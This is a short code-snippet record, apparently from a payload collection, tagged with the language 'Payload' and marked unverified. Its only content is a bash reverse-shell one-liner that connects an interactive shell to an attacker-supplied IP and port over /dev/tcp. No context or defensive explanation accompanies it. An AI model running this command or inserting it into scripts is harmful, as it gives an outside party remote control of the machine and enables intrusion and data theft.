---
id: 0a84eaf9-cc81-4edc-91f2-dc7ea1871a2d
type: code
language: Payload
verified: false
created_at: '2020-04-04T07:31:34.724210+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 0a84eaf9

**Language**: Payload

```payload
bash -c "/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
```


